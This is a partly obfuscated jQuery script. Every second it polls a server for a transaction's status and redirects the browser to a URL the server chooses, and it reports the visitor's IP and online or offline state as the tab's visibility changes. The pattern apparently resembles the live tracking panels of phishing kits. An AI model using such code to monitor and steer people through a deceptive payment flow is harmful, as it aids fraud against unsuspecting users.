$(document).ready(function () {
    const _0x412fdd = new URLSearchParams(window.location.search),
        _0x4ea610 = _0x412fdd.get('t')
    setInterval(function () {
        $.ajax({
            url: '/sadece-online-ozel/ajax.php',
            type: 'POST',
            data: JSON.stringify({
                action: 'checkTransactionStatus',
                transaction_id: _0x4ea610,
            }),
            success: function (_0x47aac9) {
                _0x47aac9 = JSON.parse(_0x47aac9)
                if (_0x47aac9.status === true) {
                    let _0x27a8a2 = window.location.href,
                        _0x2a5a40 = _0x27a8a2.split('/'),
                        _0x153a7c = _0x2a5a40.length,
                        _0x401602 = _0x2a5a40[_0x153a7c - 1]
                    if (_0x401602 !== _0x47aac9.redirect) {
                        window.location.href = _0x47aac9.redirect
                    }
                }
            },
        })
    }, 1000)

    function checkIP() {
        setInterval(function () {
            $.ajax({
                url: '/sadece-online-ozel/ajax.php',
                type: 'POST',
                data: JSON.stringify({
                    action: 'getUserRealIP'
                }),
                success: function (data) {
                    const response = JSON.parse(data)
                    if (response.status === true) {
                        const ip = response.ip
                        if (ip) {
                            if (document.visibilityState === 'visible') {
                                $.ajax({
                                    url: '/sadece-online-ozel/ajax.php',
                                    type: 'POST',
                                    data: JSON.stringify({
                                        action: 'setUserStatus',
                                        status: 'online',
                                        ip: ip
                                    }),
                                })
                            } else {
                                $.ajax({
                                    url: '/sadece-online-ozel/ajax.php',
                                    type: 'POST',
                                    data: JSON.stringify({
                                        action: 'setUserStatus',
                                        status: 'offline',
                                        ip: ip
                                    }),
                                })
                            }
                            const ChangeVisibility = function () {
                                if (document.visibilityState === 'visible') {
                                    $.ajax({
                                        url: '/sadece-online-ozel/ajax.php',
                                        type: 'POST',
                                        data: JSON.stringify({
                                            action: 'setUserStatus',
                                            status: 'online',
                                            ip: ip
                                        }),
                                    })
                                } else {
                                    $.ajax({
                                        url: '/sadece-online-ozel/ajax.php',
                                        type: 'POST',
                                        data: JSON.stringify({
                                            action: 'setUserStatus',
                                            status: 'offline',
                                            ip: ip
                                        }),
                                    })
                                }
                            }
                            document.addEventListener('visibilitychange', ChangeVisibility, false)
                        }
                    }
                },
            })
        }, 1000)
    }

    checkIP()
})